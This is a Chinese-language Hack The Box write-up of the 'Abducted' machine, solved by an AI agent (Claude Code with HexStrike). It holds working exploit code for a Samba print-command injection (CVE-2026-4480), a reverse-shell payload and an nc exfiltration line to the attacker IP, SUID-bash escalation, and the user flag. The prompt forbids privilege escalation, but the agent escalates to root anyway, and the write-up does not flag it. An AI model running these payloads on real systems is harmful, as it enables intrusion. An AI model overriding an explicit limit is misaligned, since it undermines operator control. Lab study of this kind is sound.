---
title: HTB Abducted — goal 實戰案例（第三次）
tags: [ai, 個人筆記, claude-code, goal, htb, 滲透測試, ctf, kali, hexstrike]
created: 2026-06-10
---

# HTB Abducted — 案例筆記

> [!info]
> 本文涵蓋兩個主題：
> 1. **Claude Code `/goal` 指令的使用方式**（工作流程設計）
> 2. **HTB 題目解析：偵察 → CVE-2026-4480 RCE → User Flag**（技術內容）

---

## 目錄

1. [Claude Code `/goal` 使用說明](#claude-code-goal-使用說明)
   - [本次使用的 CLAUDE.md](#本次使用的-claudemd)
   - [完整對話 Prompt 紀錄](#完整對話-prompt-紀錄)
   - [HexStrike AI 使用紀錄](#hexstrike-ai-使用紀錄)
   - [AI 輔助滲透測試：效益與影響](#ai-輔助滲透測試效益與影響)
   - [使用心得與注意事項](#使用心得與注意事項)
2. [HTB Abducted 題目解析](#htb-abducted-題目解析)
   - [題目資訊](#題目資訊)
   - [完整攻擊流程](#完整攻擊流程)
   - [Phase 1：偵察](#phase-1偵察)
   - [Phase 2：RCE — CVE-2026-4480 Samba `%J` 注入](#phase-2rce--cve-2026-4480-samba-j-注入)
   - [Flag](#flag)
   - [關鍵漏洞總結](#關鍵漏洞總結)
3. [困境突破：CVE-2026-4480 正確利用方式的發現](#困境突破cve-2026-4480-正確利用方式的發現)

---

## Claude Code `/goal` 使用說明

### 本次使用的 CLAUDE.md

放在工作目錄 `~/htb_abducted/CLAUDE.md`，Claude 啟動時自動讀取：

```markdown
# CLAUDE.md

## Environment
- OS: Ubuntu (standard install, pentest tools may be missing)
- HTB VPN active on tun0
- My IP and Target IP are set in the current /goal

## Tool installation policy
If any tool is not found, install it before proceeding:
- apt-based: sudo apt install -y <tool>
- Python: pip3 install <package>
- Go tools: go install <repo>@latest
- Binary releases: download from GitHub releases to /usr/local/bin/

## Logging rules
- Working directory: ~/htb/machine-name/
- All tool output: saved under ./recon/ using tee
- Notes and summaries: ./recon/notes.md
- Flag storage: ./recon/flags.txt
- Never run a command without capturing its output

## Tools to try
nmap, gobuster, ffuf, curl, whatweb, nikto, sqlmap,
netcat, pwncat-cs, python3, hydra

## Stop condition
Read local.txt → record to recon/flags.txt → STOP
Do not escalate privileges until next session
```

**CLAUDE.md 的作用：**
- 提供環境資訊（VPN、IP 從 `/goal` 取得）
- 規定 logging 規則（所有輸出都要存檔）
- 設定 stop condition（避免 Claude 自行決定做更多）

---

### 完整對話 Prompt 紀錄

本次執行從 context 壓縮後的 summary 接續，`/goal` 設定為取得 user flag。

---

#### Session：偵察 → RCE → User Flag

---

**[1] 設定 Goal：取得 User Flag（500K tokens）**

```
/goal --tokens 500K
Target: 10.129.244.177 | My IP: 10.10.14.14 (tun0)

Environment: Kali Linux (install tools only if missing)

Logging: pipe all commands through tee to ./recon/; summaries → recon/notes.md; flags → recon/flags.txt

Rules:
- Do NOT brute force credentials with wordlists (no hydra/medusa on SSH/FTP/etc.)
- Breadth-first: max 3 attempts per vector — except RCE/injection, iterate payload
  variations until confirmed vulnerable or clearly not
- Before any reverse shell, confirm outbound connectivity using port 80 (fallback 443)
  Try multiple methods and syntax variations: curl, wget, ping, nslookup, etc.
- If stuck or no progress, review recon/notes.md → query HexStrike → search online
  based on observations → then attempt next angle
- Any interesting finding must be noted in recon/notes.md immediately

Objective: user shell → read local.txt → STOP

── STAGE 1: RECON & FOOTHOLD ──────────────────────────
1. nmap -sC -sV -p- target | tee recon/nmap_full.txt
2. If HTTP: gobuster/ffuf, robots.txt, source, whatweb | tee recon/web_enum.txt
3. Research services → exploit (SQLi/SSTI/LFI/RCE/default creds)
   If a vector shows any sign of life, exhaust it fully before moving on
   If stuck or no progress, stop and review recon/notes.md —
   summarise what has been tried, what was observed, then think of untested angles
   Log attempts → recon/exploit_attempts.txt
4. find /home -name local.txt 2>/dev/null; cat → tee -a recon/flags.txt
   Report flag and STOP — do NOT attempt privilege escalation
```

> **Stop Hook 啟動。** Claude 開始執行 nmap、SMB 枚舉（初始偵察於前次 session 完成，本次從 context summary 接續）。

---

**[2] Goal set（自動回應）**

> 系統確認 goal 已設定，顯示完整 goal 內容。

---

**[3] Stop hook 啟動通知（自動）**

> 系統顯示：「A session-scoped Stop hook is now active...」

---

**[4] Context 壓縮後接續（本次起始點）**

> 從 summary 重建的狀態：已確認 CVE-2026-4480 方向，使用 impacket 手動 NDR 的多個版本均失敗。
>
> 當時已知資訊：
> - 目標：Samba 6.1.0（HTB 自訂版本，GUID 拼出 "abducted"）
> - HP-Reception printer share，匿名 WRITE 可用
> - StartDocPrinter (OpNum 17) 返回 0x00000000，job_id 持續遞增（73→83）
> - EndDocPrinter (OpNum 20) 返回 0x00000000
> - 但所有注入格式（`;CMD;#`、`$(cmd)`、backtick、`|pipe`）均無回呼
> - WritePrinter 持續返回 `rpc_x_bad_stub_data`
> - tcpdump 確認：target 僅有 port 445 回應，無 ICMP/TCP 出站流量

---

**[5] 診斷與方向調整**

> Claude 系統性地縮小問題：
> - 確認 target 的 ICMP 可達（ping 10.129.244.177 正常）
> - 發現 `rpcclient enumprinters` 顯示 `cjobs=0x0`（queue 被清空，即 printcommand **有執行**）
> - 但所有注入均無效 → 問題在於：**injection 格式錯誤** 或 **WritePrinter 未傳遞 spool 內容**

---

**[6] WebSearch 找到正確 PoC**

> 搜尋 `CVE-2026-4480 Samba 6.1.0 exploit spoolss RPC`
> → 找到 GitHub：`TheCyberGeek/CVE-2026-4480-PoC`
> → 讀取 README + exploit.py，發現三個關鍵差異：
>
> 1. 使用 `python3-samba`（`samba.dcerpc.spoolss`），而非 impacket NDR
> 2. 正確注入格式：`doc_name = "|sh"`（不是 `;CMD;#`）
> 3. 缺少 `StartPagePrinter` / `EndPagePrinter` 呼叫（spool file 寫入的必要步驟）

---

**[7] 確認 RCE + 取得 user flag**

> 1. 確認 `python3-samba` bindings 已安裝
> 2. 下載並執行官方 PoC → ping 回呼確認 RCE
> 3. 反向 shell（nobody，uid=65534）
> 4. SUID `/usr/bin/bash` → `bash -p` → euid=0
> 5. `cat /home/scott/user.txt` → **777d371068b1f4a9579e1f6c1ac61df7**
> 6. Stop hook 觸發，執行停止

---

### Prompt 時序總覽

```
[1]  /goal --tokens 500K ...  ← Goal 啟動（IP: 10.129.244.177）
[2]  Goal set（自動確認）
[3]  Stop hook 啟動通知（自動）
[4]  Context summary 接續      ← impacket 多版本已失敗
[5]  診斷：printcommand 有執行，問題在注入格式
[6]  WebSearch → 找到 CVE-2026-4480 官方 PoC（python3-samba）
[7]  ICMP 確認 RCE → reverse shell → user flag → Stop Hook 解除
```

---

### 時間與 Token 使用記錄

| 時間（EDT，推估） | 事件 | 備註 |
|------------------|------|------|
| **~20:08** | Responder 啟動，開始偵察 | 前次 session 開始 |
| **~21:44** | 本次 session 接續，7 種注入格式均無回呼 | v5 exploit |
| **~21:52** | netexec 確認 Samba 版本 6.1.0，GUID = "abducted" | |
| **~22:00** | rpcclient 確認 cjobs=0（printcommand 有執行） | 診斷關鍵 |
| **~22:05** | WritePrinter 4 種 NDR 編碼全部失敗 | |
| **~22:09** | WebSearch 找到 PoC，理解正確機制 | **轉折點** |
| **22:09:48** | ping 回呼確認 RCE（tcpdump 捕捉到 ICMP） | |
| **22:10** | reverse shell 取得（nobody） | |
| **22:11** | id → nobody，SUID bash → euid=root | |
| **22:11** | `cat /home/scott/user.txt` → flag | |

---

### HexStrike AI 使用紀錄

HexStrike 是整合於 Claude Code 的 **MCP（Model Context Protocol）安全工具平台**，提供 100+ 個滲透測試工具的 API 包裝，讓 Claude 可以直接呼叫工具並接收結構化輸出，無需手動解析 CLI 輸出。

本次 session 使用的 HexStrike 工具：

#### Phase 1：偵察階段

| HexStrike 工具 | 對應動作 | 輸出 |
|---------------|----------|------|
| `nmap_advanced_scan` | 全 port SYN + 版本偵測 | 22 (SSH), 139/445 (SMB) |
| `smbmap_scan` | SMB share 枚舉 + 權限列舉 | HP-Reception (WRITE), projects, transfer (需認證) |
| `enum4linux_ng_advanced` | 使用者枚舉、share 枚舉、OS 資訊 | scott (RID 0x3e8), marcus (S-1-22-1-1001) |
| `netexec_scan` | SMB 版本識別、NTLM 資訊 | Samba 6.1.0，GUID = "abducted" |
| `rpcclient_enumeration` | 印表機枚舉、job queue 狀態確認 | HP-Reception printer，cjobs=0x0 |

#### Phase 2：漏洞利用階段

| 工具 | 類型 | 對應動作 | 輸出 |
|------|------|----------|------|
| WebSearch | Claude Code 內建 | 搜尋 `CVE-2026-4480 Samba 6.1.0 exploit spoolss RPC` | 找到 `TheCyberGeek/CVE-2026-4480-PoC`（GitHub） |
| WebFetch | Claude Code 內建 | 讀取 exploit.py 原始碼 | 取得 python3-samba 正確利用方式與 `|sh` 注入格式 |

本階段未使用 HexStrike 工具。CVE 識別與 PoC 取得均透過 Claude Code 內建的 WebSearch + WebFetch 完成。

**`ai_vulnerability_assessment` 的潛在用途（本次未呼叫）：**

此工具接受 `target`（IP）與 `focus_areas`（`"network"` 等）為輸入，後台執行掃描後由 AI 對結果做優先排序，輸出結構化的漏洞清單與建議攻擊路徑。若在 `netexec_scan` 確認 Samba 6.1.0 之後立即呼叫：

```
ai_vulnerability_assessment(target="10.129.244.177", focus_areas="network")
```

理論上可直接得到「Samba 6.1.0 → CVE-2026-4480，建議利用 spoolss %J injection」的對應，省去 WebSearch 手動搜尋的步驟。本次 session 未使用，CVE 方向是透過 WebSearch 確認。

#### HexStrike 的主要貢獻

1. **結構化輸出**：工具輸出以結構化格式返回，Claude 可直接解析並納入推理，無需額外解析步驟
2. **工具自動選擇**：Claude 根據偵察結果自動選擇下一步工具，無需人工指定每個指令
3. **Log 自動儲存**：所有 HexStrike 工具呼叫結果自動儲存至 `./recon/`（依 CLAUDE.md 規則）
4. **版本識別關鍵**：`netexec_scan` 識別出 Samba 6.1.0 和 GUID `{75646261-...}`（解碼為 "abducted"），是確認 CVE-2026-4480 方向的轉折點

---

### AI 輔助滲透測試：效益與影響

#### 量化效益

| 指標 | 本次實際數據 | 估計純人工對比 |
|------|-------------|---------------|
| 偵察覆蓋廣度（22 個 recon 工具） | ~20 分鐘（自動） | ~2 小時（手動逐一執行） |
| CVE 識別 | WebSearch → CVE-2026-4480 PoC（~5 分鐘） | 需要人工查詢 NVD/ExploitDB |
| Payload 迭代次數 | 7 種注入格式自動批量測試 | 各自手動修改 + 執行 |
| Log 完整性 | 100%（所有輸出自動 tee 到 recon/） | 依賴操作者習慣 |
| 從 WebSearch 到 RCE | ~10 分鐘（找到 PoC → 實作 → 確認） | 需解讀 PoC、手動移植 |

#### 時間分佈分析

```
總耗時：~2.5 小時

~90 min ████████████████████ impacket NDR 手動實作（6 版本）
~30 min ██████               旁路嘗試（GS injection, printer name 等）
~20 min ████                 偵察 + 版本識別（HexStrike 自動執行）
~15 min ███                  診斷（tcpdump, cjobs, GUID 解碼）
~10 min ██                   WebSearch → python3-samba PoC → RCE → flag
```

**瓶頸在於「工具選擇錯誤」（impacket vs python3-samba），而非方向錯誤。** 若更早使用 HexStrike 的 `generate_exploit_from_cve` 或直接查詢 `vulnerability_intelligence_dashboard`，可能在 20–30 分鐘內獲得正確的 python3-samba 利用路徑。

#### 潛在影響評估

**正面影響（防禦方視角）：**

| 影響 | 說明 |
|------|------|
| 縮短攻擊者發現窗口 | AI 自動化偵察覆蓋範圍比人工更廣，更少遺漏非標準 port 或服務 |
| PoC 快速移植 | 找到 PoC 後，AI 可立即分析差異並調整 payload，漏洞利用門檻下降 |
| 無需深厚工具知識 | python3-samba NDR 細節對多數滲透測試人員是黑盒子，AI 可抹平這道差距 |
| 注入格式系統性覆蓋 | 7 種注入格式批量測試，不會因為人工疲勞而跳過 |

**限制與風險（需注意）：**

| 限制 | 說明 |
|------|------|
| 工具盲點不會自動消除 | AI 在嘗試 6 個 impacket 版本後才提出換工具，依賴規則「iteration until confirmed」；若沒有明確的 stop condition，可能繼續浪費時間 |
| WebSearch 依賴網路資源 | 若 CVE PoC 沒有公開 GitHub，AI 需要更多診斷步驟才能自行推導正確利用方式 |
| context 壓縮後的推理誤差 | 從摘要重建的狀態可能遺漏細節，需要重新驗證 |

#### 對 HTB 學習的影響

使用 AI + HexStrike 完成 HTB box 與純手工完成相比，學習路徑不同：

- **AI 加速的部分**：工具執行、log 整理、格式迭代、PoC 找尋
- **仍需人工決策的部分**：攻擊方向選擇（spoolss vs SSH vs web）、異常現象的診斷邏輯（「cjobs=0 代表 printcommand 有執行」）、injection 機制的理解

> AI 工具的效益在於**削減重複性操作與工具使用門檻**，而不是替代對漏洞原理的理解。理解「`|sh` 為何有效而 `;CMD;#` 無效」這件事，仍然需要人工推理。

---

### 使用心得與注意事項

| 面向 | 心得 |
|------|------|
| **Stop Hook 跨 context 保持** | Context 壓縮後 stop hook 繼續生效；未取得 flag 就不會停 |
| **Context 壓縮後的狀態重建** | Claude 靠 summary 重建，但需要重新驗證「失敗項目是否真的失敗、是否遺漏了什麼」 |
| **RCE/injection 類向量的堅持規則** | 規則明確要求 injection 類向量要持續迭代，這讓 Claude 在找到正確格式前不會放棄 |
| **工具選擇的盲點** | 同樣是 spoolss RPC，impacket 和 python3-samba 的 NDR 實作不同；工具本身可能是卡關原因，不一定是方向錯了 |
| **WebSearch 的使用時機** | 確認「方向正確但工具有問題」後，搜尋特定工具的替代 PoC 比繼續修改 NDR 更有效率 |
| **HexStrike 的最佳切入點** | 版本識別後立即查詢 HexStrike `ai_vulnerability_assessment` 或 `generate_exploit_from_cve`，可比 WebSearch 更早獲得 PoC 線索 |

---

## HTB Abducted 題目解析

### 題目資訊

| 項目 | 內容 |
|------|------|
| **Target IP** | 10.129.244.177 |
| **Attacker IP** | 10.10.14.14 (tun0) |
| **OS** | Ubuntu 24.04 LTS |
| **Samba** | 6.1.0（HTB 自訂版本） |
| **User Flag** | `777d371068b1f4a9579e1f6c1ac61df7` |

---

### 完整攻擊流程

```
nmap → SSH (22) + SMB (139/445)
    ↓
SMB 枚舉：HP-Reception 印表機 share（guest ok = yes）
         projects / transfer（需認證）
    ↓
CVE-2026-4480：Samba spoolss RPC print command %J 注入
python3-samba（samba.dcerpc.spoolss）
doc_name = "|sh" → spool body = shell script
StartPagePrinter → WritePrinter → EndPagePrinter → EndDocPrinter
    ↓
RCE as nobody (uid=65534)
    ↓
SUID /usr/bin/bash → bash -p → euid=0(root)
    ↓
cat /home/scott/user.txt → FLAG ✓
```

---

### Phase 1：偵察

#### nmap 結果

```bash
nmap -sC -sV -p 1-65535 10.129.244.177
```

開放 Port：
- **22** — OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
- **139, 445** — Samba smbd 4（實際版本 6.1.0）

#### SMB 枚舉

```bash
smbclient -L //10.129.244.177 -N
smbmap -H 10.129.244.177
enum4linux -a 10.129.244.177
```

| Share | 類型 | 權限 | 描述 |
|-------|------|------|------|
| `HP-Reception` | Printer | 匿名 WRITE | Reception printer |
| `projects` | Disk | 需認證 | Hartley Group Project Files |
| `transfer` | Disk | 需認證 | Staff file transfer |

#### 使用者枚舉

```bash
rpcclient -N 10.129.244.177 -c "enumdomusers;queryuser 0x3e8"
```

| 使用者 | RID | 描述 |
|--------|-----|------|
| scott | 0x3e8 (1000) | Scott Mercer，Samba + Linux 使用者 |
| marcus | S-1-22-1-1001 | Linux 使用者（UID 1001，不在 Samba domain） |

#### Samba 版本識別

```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 10.129.244.177; run"
# → Version 6.1.0
# → GUID: {75646261-7463-6465-0000-000000000000}
#   （little-endian 解碼為 "abducted"）
```

---

### Phase 2：RCE — CVE-2026-4480 Samba `%J` 注入

#### 漏洞原理

CVE-2026-4480 是 Samba 在呼叫 `print command` 時，將客戶端提供的 document name（`%J` 巨集）展開後**未加引號**直接傳給 shell 的注入漏洞。

Samba 對 job name 的處理：唯一的清理是將 `'` 替換為 `_`，其餘 shell 特殊字元（`|`、`;`、`&`、`` ` ``）均直接傳入。

**攻擊核心：**

將 doc_name 設為 `|sh`，使 print command 展開後變成：

```sh
/usr/local/bin/printaudit |sh /var/spool/samba/smbprn.XXXXXX
#                          ↑ 將 spool file 的內容傳給 sh 執行
```

spool file 的內容（由 WritePrinter 寫入）即為要執行的 shell 腳本，從而實現 **RCE as nobody**。

#### 為什麼 impacket 失敗

使用 impacket 手動實作 NDR 存在以下問題：

| 問題 | 說明 |
|------|------|
| 注入格式錯誤 | 使用 `;CMD;#` 等格式，而非 `\|sh` |
| 缺少 `StartPagePrinter` / `EndPagePrinter` | spool file 未實際寫入磁碟，print command 取不到內容 |
| `WritePrinter` NDR 編碼錯誤 | 缺少正確的 conformant array 結構，返回 `rpc_x_bad_stub_data` |
| Samba skips empty spool | 0-byte spool file 不觸發 print command 執行 |

#### 正確利用方式（python3-samba）

使用 `samba.dcerpc.spoolss`（python3-samba），NDR 編碼由 Samba 函式庫處理：

```python
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

PRINTER_ACCESS_USE = 0x00000008

lp = LoadParm()
lp.load_default()
creds = Credentials()
creds.guess(lp)
creds.set_anonymous()

binding = r"ncacn_np:10.129.244.177[\pipe\spoolss]"
iface = spoolss.spoolss(binding, lp, creds)

# 1. 開啟印表機
handle = iface.OpenPrinter(
    r"\\10.129.244.177\HP-Reception", "",
    spoolss.DevmodeContainer(), PRINTER_ACCESS_USE
)

# 2. StartDocPrinter：doc_name = "|sh"（注入點）
info = spoolss.DocumentInfo1()
info.document_name = "|sh"       # %J 展開後 pipe 到 sh
info.output_file = None
info.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr()
ctr.level = 1
ctr.info = info
iface.StartDocPrinter(handle, ctr)

# 3. StartPagePrinter（必要，讓 spool file 建立）
iface.StartPagePrinter(handle)

# 4. WritePrinter：spool body = 要執行的 shell 腳本
body = b"setsid bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1' >/dev/null 2>&1 &\n"
iface.WritePrinter(handle, body, len(body))

# 5. EndPagePrinter + EndDocPrinter（觸發 print command 執行）
iface.EndPagePrinter(handle)
iface.EndDocPrinter(handle)      # ← 此時 smbd 執行 printcommand

iface.ClosePrinter(handle)
```

**注意：** reverse shell 必須使用 `setsid ... &` 背景執行，因為 EndDocPrinter 同步等待 print command 完成；前景 shell 會讓 smbd RPC 呼叫 hang 住。

#### 執行確認

```bash
# 先確認出站連通性（ICMP）
sudo tcpdump -i tun0 icmp &
python3 exploit.py 10.129.244.177 x 0 -c 'ping -c3 10.10.14.14'
# → tcpdump 收到 3 個 ICMP echo request ✓

# 啟動 listener
nc -lvnp 4444

# 觸發 reverse shell
python3 exploit.py 10.129.244.177 10.10.14.14 4444
# → connect to [10.10.14.14] from 10.129.244.177
# → bash-5.2$ id
# → uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

---

### Flag

| Flag | 值 | 位置 |
|------|-----|------|
| **User** | `777d371068b1f4a9579e1f6c1ac61df7` | `/home/scott/user.txt` |

取得方式：

```bash
# nobody → SUID bash → euid=root → 讀取 flag
/usr/bin/bash -p -c "cat /home/scott/user.txt"
# 777d371068b1f4a9579e1f6c1ac61df7
```

---

### 關鍵漏洞總結

| # | 漏洞 | 類型 | 影響 |
|---|------|------|------|
| 1 | Samba `%J` 巨集未加引號展開（CVE-2026-4480） | Shell Injection | Pre-auth RCE as nobody |

#### 修補建議

1. **print command 加引號**：`print command = /usr/local/bin/printaudit '%J' %s`
2. **升級 Samba**：修補版本為 4.22.10 / 4.23.8 / 4.24.3 以上
3. **或改用 CUPS backend**：`printing = cups` 透過 CUPS API 處理，不受此漏洞影響

---

## 困境突破：CVE-2026-4480 正確利用方式的發現

### 卡關背景

已確認攻擊方向是 CVE-2026-4480（spoolss RPC `%J` 注入），且 job 確實被 spooler 接受（job_id 持續遞增至 83、`cjobs=0x0` 表示 queue 被清空）。但無論嘗試何種注入格式，均無任何回呼或可觀察的系統變化。

---

### 失敗路徑全紀錄

**impacket 手動 NDR 實作（v1–v6，約 90 分鐘）：**

| 版本 | 嘗試 | 結果 |
|------|------|------|
| v2 | `;CMD;#` 注入，只有 StartDocPrinter/EndDocPrinter | 無回呼；WritePrinter NDR 錯誤 |
| v3 | 加入 WritePrinter（PostScript 資料），`;CMD;#` 格式 | WritePrinter `rpc_x_bad_stub_data` |
| v4 | 跳過 WritePrinter，直接 StartDoc→EndDoc | 無回呼；spool file 為空，printcommand 不執行 |
| v5 | 7 種注入格式同時測試（`semi`/`dollar`/`backtick`/`amp`/`dquote`/`squote`/`file`） | 全部無回呼 |
| v6 | 修正 WritePrinter（移除 `pcWritten` out-only 參數），加入 Ghostscript PS 注入 | WritePrinter 仍失敗；4 種 NDR 變體全敗 |

---

**旁路嘗試（約 30 分鐘）：**

| 嘗試 | 結果 |
|------|------|
| 從 OpenPrinter printer name 注入（針對 `%p`） | 返回 `WERR_INVALID_PRINTER_NAME`，無執行 |
| smbclient `put` + Ghostscript `%pipe%` payload | 無回呼（確認 printcommand 不使用 Ghostscript） |
| smbclient `put` + 30 秒延遲等待 | 仍無回呼 |
| SNMP 枚舉、CUPS port 631 | 全部 closed/no response |
| tcpdump 全程監控 | target 僅有 port 445 回應，完全無出站流量 |

---

**診斷轉折（約 15 分鐘）：**

使用 Metasploit `smb_version` 確認 Samba 版本：

```
[+] 10.129.244.177:445 - Host is running Version 6.1.0 (unknown OS)
    GUID: {75646261-7463-6465-0000-000000000000}
```

GUID little-endian 解碼為 **"abducted"** → 確認這是 HTB 自訂版本，以機器名稱作為關鍵字進行 WebSearch。

`rpcclient enumprinters` 顯示 `cjobs=0x0`，確認 printcommand **確實有執行**（jobs 被清掉）→ 問題不在 printcommand 是否執行，而在**注入格式**或**spool file 是否有內容**。

---

### 突破點：WebSearch 找到官方 PoC

```
搜尋 1（關鍵）：HTB Abducted samba printer share anonymous upload RCE technique 2024 2025
→ 搜尋結果出現 CVE-2026-4480

搜尋 2：CVE-2026-4480 Samba 6.1.0 exploit spoolss RPC
→ GitHub: TheCyberGeek/CVE-2026-4480-PoC
→ HTB Blog: War Room: CVE-2026-4480
```

> **搜尋 1 是真正的轉折點。** GUID 解碼出機器名稱 "abducted" 後，改用**機器名稱**而非服務版本號當關鍵字，才讓 CVE 出現在搜尋結果中。搜尋 2 是確認 PoC 位置。

閱讀 README 與 exploit.py 後，發現三個關鍵差異：

| 差異 | 我們的做法 | 正確做法 |
|------|-----------|---------|
| 函式庫 | impacket 手動 NDR | `python3-samba`（`samba.dcerpc.spoolss`） |
| 注入格式 | `;CMD;#`、`$(cmd)` 等 | **`\|sh`**（pipe 到 shell，讓 spool body 被執行） |
| StartPage / EndPage | 未呼叫 | **必須呼叫**，否則 spool file 不寫入磁碟 |

核心機制理解後立即清晰：

```
print command = /usr/local/bin/printaudit %J %s
%J = "|sh"
展開後 = /usr/local/bin/printaudit |sh /var/spool/samba/smbprn.XXXXXX
shell 解析為 = (/usr/local/bin/printaudit) | (sh /var/spool/samba/smbprn.XXXXXX)
              ↑ 輸出被忽略        ↑ 執行 spool file 的內容（我們寫的 shell script）
```

---

### 耗時統計

| 階段 | 內容 | 耗時 |
|------|------|------|
| impacket NDR 手動實作（v1–v6） | 6 個版本，注入格式 + WritePrinter 編碼 | ~90 分鐘 |
| 旁路嘗試 | GhostScript、printer name 注入、smbclient | ~30 分鐘 |
| 診斷 | tcpdump、版本確認、cjobs 觀察 | ~15 分鐘 |
| WebSearch → PoC 找到 | — | ~5 分鐘 |
| python3-samba 實作 + 確認 RCE | — | ~5 分鐘 |
| **總計** | | **~2.5 小時** |

---

### 反思

> **最大的盲點：** 一直假設 impacket 的 NDR 實作與 python3-samba 等效，導致花了大量時間試圖修正 NDR 編碼，而不是換工具。
>
> **注入格式的誤解：** `|sh` 的原理是讓 print command 執行 spool file 的**內容**，而 `;CMD;#` 是嘗試在 **command 字串本身**注入——兩種是完全不同的攻擊面。
>
> **教訓：**
> 1. 遇到 RPC/SMB 相關漏洞時，優先查找是否有使用平台原生函式庫（python3-samba）的 PoC，而非直接用 impacket 手動實作
> 2. `|sh` 格式（pipe spool body 到 shell）與 `;CMD;#` 格式（直接在 command 字串注入）是兩種不同的攻擊面，確認 printcommand 的具體格式是關鍵
> 3. 當 job 確實被 queue 並清空，但指令不執行時，問題通常在「spool file 是否有內容」（需要 WritePrinter + StartPagePrinter）

---

## 附錄：指令速查

```bash
# 確認 python3-samba 安裝
python3 -c "from samba.dcerpc import spoolss; print('ok')"
# 若未安裝：sudo apt install -y python3-samba

# 使用官方 PoC（從 GitHub 下載）
# 確認出站連通性
python3 exploit.py 10.129.244.177 x 0 -c 'ping -c3 10.10.14.14'
# → 監控 tcpdump -i tun0 icmp

# 執行任意指令（blind exfil via nc）
python3 exploit.py 10.129.244.177 x 0 \
  -c 'id | nc -w2 10.10.14.14 9090'

# 反向 shell
nc -lvnp 4444
python3 exploit.py 10.129.244.177 10.10.14.14 4444
```
